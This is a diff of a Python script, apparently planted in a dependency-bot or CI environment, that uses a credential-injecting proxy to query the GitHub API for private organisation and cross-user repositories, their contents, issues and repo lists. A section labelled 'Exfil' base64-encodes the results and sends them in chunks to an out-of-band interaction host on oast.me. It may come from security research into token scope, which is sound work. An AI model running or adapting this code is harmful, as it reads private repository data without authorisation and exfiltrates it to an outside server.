@@ -1,80 +1,76 @@
-import os, urllib.request, base64, json, subprocess
+import os, urllib.request, base64, json
 
 results = {}
 
-# Test: Does the proxy inject credentials for other GitHub services?
+# The API might have broader scope than git!
+# Test API access to PRIVATE repos in the same org
 
-# 1. git ls-remote on raw.githubusercontent.com (different subdomain)
+# 1. Private org repo (git failed earlier - does API work?)
 try:
-    r = subprocess.run(['git', 'ls-remote', 'https://raw.githubusercontent.com/toofikz2/depbot-impact-test', 'HEAD'],
-                       capture_output=True, text=True, timeout=10)
-    results['git_raw'] = f'rc={r.returncode} out={r.stdout[:50]} err={r.stderr[:80]}'
-except Exception as e:
-    results['git_raw'] = str(e)[:80]
-
-# 2. HTTP to npm.pkg.github.com through proxy (check if credential injected)
-try:
-    req = urllib.request.Request('https://npm.pkg.github.com/@tooforg/test')
-    resp = urllib.request.urlopen(req, timeout=5)
+    req = urllib.request.Request('https://api.github.com/repos/tooforg/private-test-repo')
+    resp = urllib.request.urlopen(req, timeout=10)
     data = resp.read()
-    results['npm_pkg'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
+    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
+    results['api_private_org_repo'] = d[:300]
 except Exception as e:
-    results['npm_pkg'] = str(e)[:100]
+    results['api_private_org_repo'] = str(e)[:150]
 
-# 3. GitHub GraphQL API through proxy
+# 2. Read private repo CONTENTS (would prove cross-repo data access!)
 try:
-    req = urllib.request.Request('https://api.github.com/graphql')
-    req.add_header('Content-Type', 'application/json')
-    req.data = b'{"query":"{ viewer { login } }"}'
-    resp = urllib.request.urlopen(req, timeout=5)
+    req = urllib.request.Request('https://api.github.com/repos/tooforg/private-test-repo/contents/README.md')
+    resp = urllib.request.urlopen(req, timeout=10)
     data = resp.read()
-    results['graphql'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
+    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
+    results['private_contents'] = d[:300]
 except Exception as e:
-    results['graphql'] = str(e)[:100]
+    results['private_contents'] = str(e)[:150]
 
-# 4. GitHub API /repos endpoint through proxy (different from /user)
+# 3. List private repo issues (contains our canary data!)
 try:
-    req = urllib.request.Request('https://api.github.com/repos/toofikz2/depbot-impact-test')
-    resp = urllib.request.urlopen(req, timeout=5)
+    req = urllib.request.Request('https://api.github.com/repos/tooforg/private-test-repo/issues?per_page=1')
+    resp = urllib.request.urlopen(req, timeout=10)
     data = resp.read()
-    results['api_repos'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
+    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
+    results['private_issues'] = d[:400]
 except Exception as e:
-    results['api_repos'] = str(e)[:100]
+    results['private_issues'] = str(e)[:150]
 
-# 5. Test ghcr.io (GitHub Container Registry)
+# 4. Cross-user private repo (toofikz1's personal repo)
 try:
-    req = urllib.request.Request('https://ghcr.io/v2/')
-    resp = urllib.request.urlopen(req, timeout=5)
+    req = urllib.request.Request('https://api.github.com/repos/toofikz1/personal-secret-repo')
+    resp = urllib.request.urlopen(req, timeout=10)
     data = resp.read()
-    results['ghcr'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
+    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
+    results['crossuser_private'] = d[:300]
 except Exception as e:
-    results['ghcr'] = str(e)[:100]
+    results['crossuser_private'] = str(e)[:150]
 
-# 6. Test if we can read PRIVATE repo content through the proxy
-# (the credential might allow content access via raw.githubusercontent.com)
+# 5. Check /user to see WHO we are (might work now with different timing)
 try:
-    req = urllib.request.Request('https://raw.githubusercontent.com/tooforg/private-test-repo/main/README.md')
-    resp = urllib.request.urlopen(req, timeout=5)
+    req = urllib.request.Request('https://api.github.com/user')
+    resp = urllib.request.urlopen(req, timeout=10)
     data = resp.read()
-    results['private_raw'] = (data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data))[:200]
+    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
+    results['api_user'] = d[:300]
 except Exception as e:
-    results['private_raw'] = str(e)[:100]
+    results['api_user'] = str(e)[:150]
 
-# 7. Test accessing ANOTHER USER's private repo via git through proxy
+# 6. List org repos (would show ALL repos including private)
 try:
-    r = subprocess.run(['git', 'ls-remote', 'https://github.com/toofikz1/personal-secret-repo.git', 'HEAD'],
-                       capture_output=True, text=True, timeout=10,
-                       env={**os.environ, 'GIT_TERMINAL_PROMPT': '0'})
-    results['crossuser_git'] = f'rc={r.returncode} out={r.stdout[:50]} err={r.stderr[:80]}'
+    req = urllib.request.Request('https://api.github.com/orgs/tooforg/repos?type=private&per_page=5')
+    resp = urllib.request.urlopen(req, timeout=10)
+    data = resp.read()
+    d = data.decode('utf-8', errors='replace') if isinstance(data, bytes) else str(data)
+    results['org_private_repos'] = d[:300]
 except Exception as e:
-    results['crossuser_git'] = str(e)[:80]
+    results['org_private_repos'] = str(e)[:150]
 
 # Exfil
 payload = base64.urlsafe_b64encode(json.dumps(results).encode()).decode()
 chunks = [payload[i:i+1800] for i in range(0, min(len(payload), 14000), 1800)]
 for i, chunk in enumerate(chunks):
     try:
-        urllib.request.urlopen('http://' + 'd99nibe1b2etnockvmb0erm7ukhz99koq.oast.me' + '/v11/' + str(i) + '?d=' + chunk, timeout=5)
+        urllib.request.urlopen('http://' + 'd99nibe1b2etnockvmb0erm7ukhz99koq.oast.me' + '/v12/' + str(i) + '?d=' + chunk, timeout=5)
     except:
         pass
 
